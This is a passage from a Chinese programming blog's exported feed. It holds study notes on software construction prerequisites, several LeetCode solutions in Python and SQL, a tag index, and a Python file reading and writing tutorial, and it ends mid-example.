src="https://upload-images.jianshu.io/upload_images/6908911-e053cbb9582d5047.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="方案选择"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-f4a24687627fef82.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="方案选择"><br>Upstream Prerequisites<br>Measure Twice, Cut Once<br>构建活动差不多占整个项目成本的65%。<br>有的软件项目最终会进行两三次(甚至更多)构建。<br>将项目中最昂贵的部分执行两遍,这无论在软件行业还是在其他行业都是愚蠢的主意。</p><h1 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h1><p><strong>问题、需求分析、架构、设计、项目规划、风险防御、因地制宜</strong><br>事先做好计划能减小很多压力，让你的经验（曾经遇到的问题）来引导你吧。<br>创作引人注目的商业案例、<br>分析出全面而准确的需求、<br>创建高质量的架构</p><p>准备工作的中心目标就是降低风险:一个好的项目规划者能够尽可能早地将主要的风险清除掉,以使项目的大部分工作能够尽可能平稳地进行。<br>目前,软件开发中最常见的项目风险是糟糕的需求分析和糟糕的项目计划。<br>因此准备工作就倾向于集中改进需求分析和项目规划。<br>构建活动的准备工作不是一门精密科学,要根据每一个项目的特点来选择特定的降低风险的方法。<br>具体细节随项目的不同,会有非常大的变化。</p><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><p>一开始就把事情做好是最合算的。<br>客户沟通、捕捉需求、动态需求、设计轮廓<br>需求、架构、设计、程序。<br>架构师吃掉需求,设计师吃掉架构,而程序员则消化设计。程序员是软件食物链的最后一环。<br>在软件开发中,如果需求被污染了,那么它就会污染架构,而架构又会污染构建。这样会导致程序员脾气暴躁、营养失调;开发出的软件具有放射性污染,而且周身都是缺陷。<br>如果你正为某个高度迭代的项目做计划,先弄清哪些是最关键的需求和架构要素（那么在开始构建活动之前,你需要针对将要构造的每一片段,）。</p><h2 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h2><p>规模、时间、人数、计算机台数</p><h1 id="为什么合适的准备工作是非常重要的"><a href="#为什么合适的准备工作是非常重要的" class="headerlink" title="为什么合适的准备工作是非常重要的"></a>为什么合适的准备工作是非常重要的</h1><p>尽早查找并修正错误<br><img src="https://upload-images.jianshu.io/upload_images/6908911-73bdbfba79a49a39.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="缺陷检测成本"></p><h1 id="如何判定“是否已经准备好开始构建工作了”"><a href="#如何判定“是否已经准备好开始构建工作了”" class="headerlink" title="如何判定“是否已经准备好开始构建工作了”"></a>如何判定“是否已经准备好开始构建工作了”</h1><p>定义问题、要求、辨明当时的形势<br>定下解决方案的规格<br>设计解决方案<br>计划</p><h1 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h1><p>使用高质量的实践方法是那些能创造高质量软件的程序员的共性。<br>这些高质量的实践方法在项目的初期、中期、末期都强调质量.</p><h2 id="末期"><a href="#末期" class="headerlink" title="末期"></a>末期</h2><p>系统测试。<br>当提到软件质量保证的时候,许多人都会想到测试。但是测试只是完整的质量保证策略的一部分,而且不是最有影响的部分。测试是不可能检查出诸如“制造了一个错误的产品”。<br>“使用错误的方法制造正确的产品”之类的缺陷的。这样的缺陷必须在测试之前解决。更确切地说是在构建活动之前。</p><h2 id="中期"><a href="#中期" class="headerlink" title="中期"></a>中期</h2><p>构建实践。</p><h2 id="初期"><a href="#初期" class="headerlink" title="初期"></a>初期</h2><p>计划、要求并且设计一个高质量的产品。<br>如果你用为 Pontiac Aztek做的设计来开始整个生产过程,那么你可以想尽办法来测试,它也绝对不会变成劳斯莱斯。<br>也许你能造出最好的 Aztek,但如果想要的是一辆劳斯莱斯,那么你就得从头开始做计划。<br>在软件开发中,你也需要在定义问题、定下解决方案的规格,以及设计解决方案的时候做出这种计划。<br>在你开始构建的时候,项目前期工作已经或多或少为这个项目的成功或失败打下了基础。<br>然而,在构建过程中,你至少应该能辨明当时的形势如何,如果你看到失败的乌云已经出现在地平线上时,就退回到项目的前期工作吧。</p><h1 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h1><p>ProfessionalSoftware Deve-opment(《专业软件开发〉,Mcconnell 2004第16章描述了项能培养这些技能的专业培养计划。<br>入阅读有关这主题的更多愉快的变奏,请阅Gerald Weinberg的经典著作〈ThePsychology of Co-mputer Programming〉( Weinberg1998)。</p><p>这种现象被称为 WISCA综合症或者WIMP综合症: Why Isn’ t Sam CodingAnything?(为什么Sam不在写代码?)或者 Why Isn’ t Mary Programing?(为什么Mary不在编程?</p>]]></content>
      
      
      
        <tags>
            
            <tag> wiki </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>univalued-binary-tree</title>
      <link href="/cs/leetcode/univalued-binary-tree/"/>
      <url>/cs/leetcode/univalued-binary-tree/</url>
      
        <content type="html"><![CDATA[<p>判断二叉树是否是单值二叉树。<br>univalued-binary-tree <a href="https://leetcode.com/problems/univalued-binary-tree/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/univalued-binary-tree/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>1.层层推进的判断，调用自身<br>2.唯一性用集合长度来表示<br>3.<code>node.val</code> , <code>node.left</code> , <code>node.right</code><br><a id="more"></a></p><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>判断二叉树是否是单值二叉树</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isUnivalTree</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        vals = []</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(node)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> node:</span><br><span class="line">                vals.append(node.val)</span><br><span class="line">                dfs(node.left)</span><br><span class="line">                dfs(node.right)</span><br><span class="line"></span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> len(set(vals)) == <span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 二叉树 </tag>
            
            <tag> 递归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tag</title>
      <link href="/cs/tag/"/>
      <url>/cs/tag/</url>
      
        <content type="html"><![CDATA[<p>tag全分类<br><a id="more"></a><br><a href="/tags/空闲扩展">空闲扩展</a> <a href="/tags/思考">思考</a><br><a href="/tags/achieve">achieve</a> <a href="/tags/todo">todo</a> <a href="/tags/raw">raw</a><br><a href="/tags/学习笔记">学习笔记</a> <a href="/tags/后续学习">后续学习</a><br><a href="/tags/mind">mind</a> <a href="/tags/fix">fix</a><br><a href="/tags/核对表">核对表</a><br><a href="/tags/数据结构">数据结构</a> <a href="/tags/基本数据类型">基本数据类型</a><br><a href="/tags/mysql">mysql</a><br><a href="/tags/ML">ML</a> <a href="/tags/NLP">NLP</a> <a href="/tags/NLTK">NLTK</a> <a href="/tags/文本分析">文本分析</a><br><a href="/tags/编程基础">编程基础</a><br><a href="/tags/python">python</a> <a href="/tags/python基础">python基础</a> <a href="/tags/jupyter">jupyter</a> <a href="/tags/GUI">GUI</a> <a href="/tags/爬虫">爬虫</a><br><a href="/tags/code">code</a><br><a href="/tags/book">book</a> <a href="/tags/web">web</a> <a href="/tags/menu">menu</a> <a href="/tags/github">github</a> <a href="/tags/转载">转载</a><br><a href="/tags/wiki">wiki</a> <a href="/tags/one">one</a><br><a href="/tags/packtpub">packtpub</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> todo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>swap-salary</title>
      <link href="/cs/leetcode/swap-salary/"/>
      <url>/cs/leetcode/swap-salary/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>数据库中属性（如男女）互换。<br>swap-salary <a href="https://leetcode.com/problems/swap-salary/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/swap-salary/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>SQL语句，记一下好了。<br>UPDATE SET CASE END WHEN THEN ELSE<br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> salary </span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line">    sex = <span class="keyword">CASE</span> sex</span><br><span class="line">        <span class="keyword">WHEN</span> <span class="string">'m'</span> <span class="keyword">THEN</span> <span class="string">'f'</span></span><br><span class="line">        <span class="keyword">ELSE</span> <span class="string">'m'</span></span><br><span class="line">    <span class="keyword">END</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sort-array-by-parity-ii</title>
      <link href="/cs/leetcode/sort-array-by-parity-ii/"/>
      <url>/cs/leetcode/sort-array-by-parity-ii/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>给定非负整数数组，该数组中奇数的个数和偶数的个数相同。重新排列数组，使元素的奇偶性和元素的索引的奇偶性一致。<br>sort-array-by-parity-ii <a href="https://leetcode.com/problems/sort-array-by-parity-ii/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/sort-array-by-parity-ii/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>1.初始化一个固定长度的数组<br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortArrayByParityII</span><span class="params">(self, A)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type A: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        lst = [<span class="keyword">None</span>] * len(A)</span><br><span class="line">        evenIndex,oddIndex = <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> A:</span><br><span class="line">            <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                lst[evenIndex] = x</span><br><span class="line">                evenIndex += <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lst[oddIndex] = x</span><br><span class="line">                oddIndex += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> lst</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 20190116 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>self-dividing-numbers</title>
      <link href="/cs/leetcode/self-dividing-numbers/"/>
      <url>/cs/leetcode/self-dividing-numbers/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>求两个整数之间能被自身所有十进制位上的数字整除的数。<br>self-dividing-numbers <a href="https://leetcode.com/problems/self-dividing-numbers/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/self-dividing-numbers/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>1.先单个判断，再进行范围遍历。<br>2.<code>str</code>和<code>int</code>的妙用。<br>3.好好体会<code>return</code>的位置和用法。<br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">selfDividingNumbers</span><span class="params">(self, left, right)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">self_dividing</span><span class="params">(n)</span>:</span></span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> str(n):</span><br><span class="line">                <span class="keyword">if</span> d == <span class="string">'0'</span> <span class="keyword">or</span> n % int(d) &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">        ans = []</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(left, right + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> self_dividing(n):</span><br><span class="line">                ans.append(n)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>search-in-a-binary-search-tree</title>
      <link href="/cs/leetcode/search-in-a-binary-search-tree/"/>
      <url>/cs/leetcode/search-in-a-binary-search-tree/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>在BST中找到节点值等于给定值的节点。<br>search-in-a-binary-search-tree <a href="https://leetcode.com/problems/search-in-a-binary-search-tree/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/search-in-a-binary-search-tree/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>1.<code>while</code>递归中的<code>return</code><br>2.<code>temp = temp.left</code>的用法</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>1.BST中父节点和子节点的值的大小关系是固定的吗<br>2.搜索不到则返回<code>NULL</code>是如何呈现的<br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchBST</span><span class="params">(self, root, val)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :type val: int</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        temp = root</span><br><span class="line">        <span class="keyword">while</span> temp:</span><br><span class="line">            <span class="keyword">if</span> temp.val == val:</span><br><span class="line">                <span class="keyword">return</span> temp</span><br><span class="line">            <span class="keyword">elif</span> temp.val &gt; val:</span><br><span class="line">                temp = temp.left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                temp = temp.right</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 20190116 </tag>
            
            <tag> 二叉树 </tag>
            
            <tag> 搜索 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python的特殊方法</title>
      <link href="/cs/python%E7%9A%84%E7%89%B9%E6%AE%8A%E6%96%B9%E6%B3%95/"/>
      <url>/cs/python%E7%9A%84%E7%89%B9%E6%AE%8A%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>面向对象编程的类中具有特殊意义的方法<br><a id="more"></a><br>韦玮 python基础实例教程 12.2节<br>方法名|含义<br>–|–<br><strong>init</strong>()|初始化，进行初始化操作<br><strong>del</strong>()|在对象消失前一刻用的<br><strong>len</strong>()|对对象执行len()函数调用时，自动触发。一般用于设置对象长度。’’’def <strong>len</strong>(self): return’’’ 一个类的预设的长度<br><strong>str</strong>()|对对象使用print()或str()时被自动调用，返回字符串</p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识整理 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python文件读写</title>
      <link href="/cs/Python%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/"/>
      <url>/cs/Python%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>文件读写。<br><a id="more"></a><br><a href="https://docs.python.org/3/tutorial/inputoutput.html" target="_blank" rel="noopener">官方文档</a></p><h1 id="f-open-and-f-read"><a href="#f-open-and-f-read" class="headerlink" title="f=open() and f.read()"></a>f=open() and f.read()</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">f= open(<span class="string">"file1.txt"</span>,encoding=<span class="string">'utf-8'</span>)<span class="comment">#不写encoding，默认为操作系统编码</span></span><br><span class="line">file_data=f.read() <span class="comment">#完全读取</span></span><br><span class="line">print(file_data)</span><br><span class="line">f.close() <span class="comment">#需要执行关闭操作</span></span><br><span class="line"><span class="comment"># 1111</span></span><br><span class="line"><span class="comment"># 222</span></span><br><span class="line"><span class="comment"># 333</span></span><br><span class="line"><span class="comment"># 44</span></span><br><span class="line"><span class="comment"># 5555</span></span><br><span class="line"><span class="comment"># 666</span></span><br><span class="line"><span class="comment"># 你好!</span></span><br><span class="line"><span class="comment"># hello</span></span><br></pre></td></tr></table></figure><h1 id="with-open-as-if"><a href="#with-open-as-if" class="headerlink" title="with open() as if:"></a>with open() as if:</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"file.txt"</span>,encoding=<span class="string">'utf-8'</span>)<span class="keyword">as</span> f:</span><br><span class="line">    file_data=f.read()</span><br><span class="line">    print(file_data)  <span class="comment">#不需要执行close(),系统会自动关闭。</span></span><br><span class="line"><span class="comment"># 1111</span></span><br><span class="line"><span class="comment"># 222</span></span><br><span class="line"><span class="comment"># 333</span></span><br><span class="line"><span class="comment"># 44</span></span><br><span class="line"><span class="comment"># 5555</span></span><br><span class="line"><span class="comment"># 666</span></span><br><span class="line"><span class="comment"># 你好!</span></span><br><span class="line"><span class="comment"># hello</span></span><br></pre></td></tr></table></figure><h1 id="readline"><a href="#readline" class="headerlink" title="readline()"></a>readline()</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"file.txt"</span>,encoding=<span class="string">'utf-8'</span>)<span class="keyword">as</span> f:</span><br><span class="line">    print(f.readable()) <span class="comment">#判断是否可读</span></span><br><span class="line">    print(f.writable()) <span class="comment">#判断是否可写</span></span><br><span class="line">    print(<span class="number">1</span>, f.readline()) <span class="comment">#一次只读一行</span></span><br><span class="line">    print(<span class="number">2</span>, f.readline())</span><br><span class="line">    print(<span class="number">3</span>, f.readline())</span><br><span class="line">    print(<span class="number">4</span>, f.readline())</span><br><span class="line">    print(<span class="number">5</span>, f.readline())</span><br><span class="line">    print(<span class="number">6</span>, f.readline())</span><br><span class="line">    print(<span class="number">7</span>, f.readline())</span><br><span class="line">    print(<span class="number">8</span>, f.readline())</span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="comment"># False</span></span><br><span class="line"><span class="comment"># 1 1111</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 2 222</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 3 333</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 4 44</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 5 5555</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 6 666</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 7 你好!</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 8 hello</span></span><br></pre></td></tr></table></figure><h1 id="readlines"><a href="#readlines" class="headerlink" title="readlines()"></a>readlines()</h1><p>将文件内容读取到列表中<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"file.txt"</span>,encoding=<span class="string">'utf-8'</span>)<span class="keyword">as</span> f:</span><br><span class="line">   print(f.readlines()) </span><br><span class="line"><span class="comment">#['1111\n', '222\n', '333\n', '44\n', '5555\n', '666\n', '你好!\n', 'hello']</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        print(i)</span><br><span class="line"><span class="comment">#         1111</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#         222</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#         333</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#         44</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#         5555</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#         666</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#         你好!</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#         hello</span></span><br></pre></td></tr></table></figure></p><h1 id="不打印换行符-print-end-’’"><a href="#不打印换行符-print-end-’’" class="headerlink" title="不打印换行符 print(,end=’’)"></a>不打印换行符 print(,end=’’)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'file.txt'</span>,<span class="string">'r'</span>,encoding=<span class="string">'utf-8'</span>,newline=<span class="string">''</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.readlines())</span><br><span class="line"><span class="comment"># #     ['1111\r\n', '222\r\n', '333\r\n', '44\r\n', '5555\r\n', '666\r\n', '你好!\r\n', 'hello']</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        print(i,end=<span class="string">''</span>) <span class="comment">#不打印换行符</span></span><br><span class="line"><span class="comment">#         1111</span></span><br><span class="line"><span class="comment">#         222</span></span><br><span class="line"><span class="comment">#         333</span></span><br><span class="line"><span class="comment">#         44</span></span><br><span class="line"><span class="comment">#         5555</span></span><br><span class="line"><span class="comment">#         666</span></span><br><span class="line"><span class="comment">#         你好!</span></span><br><span class="line"><span class="comment">#         hello</span></span><br></pre></td></tr></table></figure><h1 id="write-args-writelines-args-和seek-args"><a href="#write-args-writelines-args-和seek-args" class="headerlink" title="write(args),writelines(args)和seek(args)"></a>write(args),writelines(args)和seek(args)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'file.txt'</span>,<span class="string">'w+'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f: <span class="comment">#原文件被清空后重新写入</span></span><br><span class="line">    f.write(<span class="string">'a\n'</span>)</span><br><span class="line">    f.write(<span class="string">'b\nc\n'</span>)</span><br><span class="line">    f.writelines([<span class="string">'d\n'</span>, <span class="string">'e\n'</span>])</span><br><span class="line">    f.seek(<span class="number">0</span>) <span class="comment">#将指针seek到0位置，否则读不出数据</span></span><br><span class="line">    print(f.read())</span><br><span class="line"><span class="comment">#     # a</span></span><br><span class="line"><span class="comment">#     # b</span></span><br><span class="line"><span class="comment">#     # c</span></span><br><span class="line"><span class="comment">#     # d</span></span><br><span class="line"><span class="comment">#     # e</span></span><br></pre></td></tr></table></figure><h1 id="从指针位置所在处写入"><a href="#从指针位置所在处写入" class="headerlink" title="从指针位置所在处写入"></a>从指针位置所在处写入</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'file.txt'</span>,<span class="string">'r+'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f: <span class="comment">#从指针位置所在处写入</span></span><br><span class="line">    print(f.readline())</span><br><span class="line">    f.write(<span class="string">'a\n'</span>)</span><br><span class="line">    f.write(<span class="string">'b\nc\n'</span>)</span><br><span class="line">    f.writelines([<span class="string">'d\n'</span>, <span class="string">'e\n'</span>])</span><br><span class="line">    f.seek(<span class="number">0</span>) <span class="comment">#将指针seek到0位置，否则读不出数据</span></span><br><span class="line">    print(f.read())</span><br><span class="line"><span class="comment">#     # 1111</span></span><br><span class="line"><span class="comment">#     #</span></span><br><span class="line"><span class="comment">#     # 1111</span></span><br><span class="line"><span class="comment">#     # 222</span></span><br><span class="line"><span class="comment">#     # 333</span></span><br><span class="line"><span class="comment">#     # 44</span></span><br><span class="line"><span class="comment">#     # 5555</span></span><br><span class="line"><span class="comment">#     # 666</span></span><br><span class="line"><span class="comment">#     # 你好!</span></span><br><span class="line"><span class="comment">#     # 